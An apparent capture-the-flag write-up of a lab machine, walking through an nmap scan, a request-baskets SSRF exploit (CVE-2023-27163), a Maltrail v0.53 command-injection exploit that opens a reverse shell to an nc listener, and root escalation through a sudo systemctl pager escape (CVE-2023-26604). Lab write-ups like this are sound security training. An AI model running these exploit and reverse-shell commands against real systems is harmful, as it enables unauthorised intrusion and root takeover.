
- I start with a `nmap` scan to enumerate ports
```shell
nmap -sV -sC 10.10.11.224
```
![[Pasted image 20250829224814.png]]
- I got 3 ports open
	- `22` - for `ssh`
	- `80` - for http
	- `55555` - another http port

- Trying to access the the default http port `80` I get no result so next is to check the `55555` port 
- Checking the `55555` port I get a page `Request Baskets`
![[Pasted image 20250829230651.png]]

- Down the page the soft and its version appears, that being `request-baskets v1.2.1`
![[Pasted image 20250829230800.png]]

- Searching on the internet something about this software version I found a vulnerability that being the [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
- The `request-baskets v1.2.1` contains a Server-Side Request Forgery (`SSRF`) via the `/api/baskets/{name}` component
- This vulnerability allows us to access network resources via API request
- Learning that I can access other network resources, my mind instantly went to the web app that is present on port `80` 

- I started searching for a `PoC` for this vulnerability and I found a GitHub repo containing one https://github.com/madhavmehndiratta/CVE-2023-27163 
- To use the exploit I specified the target URL which is `http://10.10.11.224:55555` and then the network resource I wanted to gain access, that being `http://127.0.0.1:80`
```shell
python3 CVE-2023-27163 http://10.10.11.224:55555 http://127.0.0.1:80
```
![[Pasted image 20250829232004.png]]
- So now at the given URL we should gain access to the http server which is located at the `80` port 
![[Pasted image 20250829232103.png]]
- We got access to some web page which doesn't seem organized but down the page I can see that this web app is powered by `Maltrail v0.53`
- So again I thought of searching for some information vulnerabilities about this software 

- I found the perfect information, which is an exploit that leads to command injection
- The exploit can be found here https://github.com/spookier/Maltrail-v0.53-Exploit and give me a reverse shell
```shell
python3 exploit.py 10.10.14.8 4444 http://10.10.11.224:55555/haywqa
```

- In the meantime I opened a listener on port `4444` using `nc -lvnp 4444` and I got a shell as the `puma` user and also found the user flag in `/home/puma/user.txt` file
![[Pasted image 20250829233738.png]]

## Root Flag

- Now that I gained access as the `puma` user and found the user flag, I use a python one-line script to upgrade my shell
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- Running the command `sudo -l` I discovered that I can pair up `sudo` with `/usr/bin/systemctl status trail.service` 
![[Pasted image 20250829235004.png]]

- Because I got nothing in mind to work with this information, I searched for `systemctl` version and found that is `systemd 245 (245.4-4ubuntu3.22)`
- Now having this version I searched on the Internet for some vulnerability of `systemd 245` paired up with the fact that I can use `sudo systemctl status` and lucky me I found exactly what I needed, the [CVE-2023-26604](https://nvd.nist.gov/vuln/detail/cve-2023-26604) 

- I also found on this page https://sploitus.com/exploit?id=EDB-ID:51674 how exactly to exploit this vulnerability
- After using the `sudo systemctl status trail.service` command, a pager opens and immediately after I have to type `!/bin/sh` to get a shell as the `root` user
![[Pasted image 20250829235628.png]]

- The exploit worked as it was documented and I got myself a shell as the `root` user and a grasp on the system flag in the `/root/root.txt` file
![[Pasted image 20250829235734.png]]
